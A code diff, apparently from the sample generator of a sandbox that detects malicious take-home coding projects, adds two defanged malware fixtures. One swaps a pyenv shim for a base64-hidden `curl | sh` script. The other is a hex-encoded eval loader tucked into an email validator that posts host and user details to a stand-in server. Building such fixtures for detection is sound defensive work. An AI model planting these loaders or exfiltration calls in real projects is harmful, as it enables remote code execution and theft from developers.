@@ -520,6 +520,76 @@ r.on("error", () => {}); r.end(body);
     }
 
 
+def m15_pyenv_swap():
+    t, s = ("Swaps the developer's pyenv executable for a script that fetches commands from a server, then sends "
+            "a machine fingerprint to its C2."), \
+        "BleepingComputer 3 Nov 2026 (Binance heist: a take-home replaced Homebrew's pyenv executable)"
+    # the replacement pyenv (runs `curl ... | sh` against TEST-NET when invoked): stored base64 (static-AV bait)
+    shim_b64 = (
+        "IyEvdXNyL2Jpbi9lbnYgYmFzaAojIEJVUk5FUiBURVNUIFNBTVBMRSAtIERFRkFOR0VELiBTd2FwcGVkIHB5ZW52IGV4ZWN1dGFi"
+        "bGUgKEJsZWVwaW5nQ29tcHV0ZXIsIDMgTm92IDIwMjY6IEJpbmFuY2UgdGFrZS1ob21lIGhlaXN0KS4KIyBFdmVyeSB0aW1lIHRo"
+        "ZSBkZXZlbG9wZXIgcnVucyBweWVudjogYXNrIHRoZSBzZXJ2ZXIgZm9yIGNvbW1hbmRzIGFuZCBydW4gdGhlbSwgdGhlbiBhY3Qg"
+        "bGlrZSBweWVudi4KIyBEZWZhbmdlZDogdGhlIHNlcnZlciBpcyBURVNULU5FVCAoMjAzLjAuMTEzLjc3KTsgaW4gQnVybmVyJ3Mg"
+        "c2FuZGJveCB0aGUgZmFrZSBpbnRlcm5ldCBhbnN3ZXJzICJ7fSIuCiggY3VybCAtZnNTIC0tbWF4LXRpbWUgMyAiaHR0cDovLzIw"
+        "My4wLjExMy43Nzo4MDgwL2FwaS9jbWQ/aD0kKGhvc3RuYW1lKSIgfCBzaCApID4vZGV2L251bGwgMj4mMSAmCmVjaG8gInB5ZW52"
+        "IDIuNC4xNyIK")
+    js = hdr_js(t, s) + r'''const fs = require("fs"), os = require("os"), path = require("path"), http = require("http");
+// "pin the Python used by the ML worker"
+const shim = path.join(os.homedir(), ".pyenv", "shims", "pyenv");
+try {
+  // DEFANG: only ever overwrites Burner's planted fake shim, never a real pyenv
+  if (fs.readFileSync(shim, "utf8").includes('echo "pyenv 2.4.17"')) {
+    fs.writeFileSync(shim, Buffer.from("__SHIM__", "base64"));
+    fs.chmodSync(shim, 0o755);
+  }
+} catch (e) {}
+const body = JSON.stringify({ host: os.hostname(), platform: os.platform(), user: os.userInfo().username, arch: os.arch() });
+const r = http.request({ host: "203.0.113.77", port: 8080, path: "/api/register", method: "POST",
+  headers: { "content-type": "application/json", "content-length": Buffer.byteLength(body) } });
+r.on("error", () => {}); r.end(body);
+'''.replace("__SHIM__", shim_b64)
+    return t, s, "npm start", {
+        "package.json": pkg(t, s, {"name": "ml-price-predictor", "version": "1.0.0",
+                                   "scripts": {"start": "node server.js", "test": "node test/predict.test.js"}}),
+        "README.md": hdr_md(t, s) + "# ML price predictor\n\n`npm start` (sets up the Python worker), then implement "
+                                    "`predict()` in `lib/predict.js`.\n",
+        "server.js": hdr_js(t, s) + 'require("./lib/python-env");\nrequire("http").createServer((q, s) => s.end("{}")).listen(3000, () => console.log("predictor on :3000"));\n',
+        "lib/python-env.js": js,
+        "lib/predict.js": hdr_js(t, s) + "module.exports.predict = (xs) => 0;\n",
+        "test/predict.test.js": hdr_js(t, s) + 'require("assert").strictEqual(require("../lib/predict").predict([]), 0); console.log("1 passing");\n',
+    }
+
+
+def m16_hexeval_loader():
+    t, s = ("HexEval-style loader: hex-encoded code POSTs hostname/platform/username to a server and eval()s the "
+            "reply (the fake internet replies {}, so nothing runs)."), \
+        "Socket Jul 2025 (HexEval Loader: Contagious Interview npm packages); OtterCookie (NTT Security 2025)"
+    loader = r'''const os = require("os"), https = require("https");
+const info = JSON.stringify({ hostname: os.hostname(), platform: os.platform(), username: os.userInfo().username,
+                              type: os.type(), release: os.release() });
+const r = https.request({ host: "npm-metrics.example", path: "/api/v1/check", method: "POST",
+  headers: { "content-type": "application/json", "content-length": Buffer.byteLength(info) } }, (res) => {
+  let d = ""; res.on("data", (c) => (d += c));
+  // the server decides per victim what to send; Burner's fake internet answers {} so nothing is eval'd
+  res.on("end", () => { try { const j = JSON.parse(d); if (j.code) eval(Buffer.from(j.code, "hex").toString()); } catch (e) {} });
+});
+r.on("error", () => {}); r.end(info);
+'''
+    hexed = loader.encode().hex()
+    validator = hdr_js(t, s) + (
+        "module.exports.isEmail = (s) => /^[^@\\s]+@[^@\\s]+\\.[^@\\s]+$/.test(s);\n"
+        f"const _0x5f2a = '{hexed}';\n"
+        "eval(Buffer.from(_0x5f2a, 'hex').toString('utf8'));\n")
+    return t, s, "npm start", {
+        "package.json": pkg(t, s, {"name": "hr-onboarding-api", "version": "1.0.0",
+                                   "scripts": {"start": "node server.js", "test": "node test/validate.test.js"}}),
+        "README.md": hdr_md(t, s) + "# HR onboarding API\n\n`npm start`, then add validation for the signup form.\n",
+        "server.js": hdr_js(t, s) + 'const { isEmail } = require("./src/utils/validator");\nrequire("http").createServer((q, s) => s.end(JSON.stringify({ ok: isEmail("a@b.co") }))).listen(3000, () => console.log("onboarding api on :3000"));\n',
+        "src/utils/validator.js": validator,
+        "test/validate.test.js": hdr_js(t, s) + 'require("assert").ok(require("../src/utils/validator").isEmail("a@b.co")); console.log("1 passing");\n',
+    }
+
+
 # ============================================================================ benign
 
 def b01_express_api():
@@ -770,7 +840,8 @@ if (fs.existsSync(hooks)) {
 
 MALICIOUS = [m01_svg_asset_eval, m02_folderopen_os_keyed, m03_local_dep_postinstall, m04_prepare_hook,
              m05_npm_test_only, m06_time_bomb, m07_python_stealer, m08_raw_tcp, m09_dns_exfil, m10_curl_sh,
-             m11_sandbox_check, m12_obfuscated, m13_resource_bomb, m14_path_tricks]
+             m11_sandbox_check, m12_obfuscated, m13_resource_bomb, m14_path_tricks, m15_pyenv_swap,
+             m16_hexeval_loader]
 BENIGN = [b01_express_api, b02_cli_tool, b03_static_frontend, b04_flask_app, b05_github_api_tests, b06_dotenv_own,
           b07_postinstall_build, b08_vscode_tasks_manual, b09_python_cli, b10_home_config, b11_husky_prepare]
 
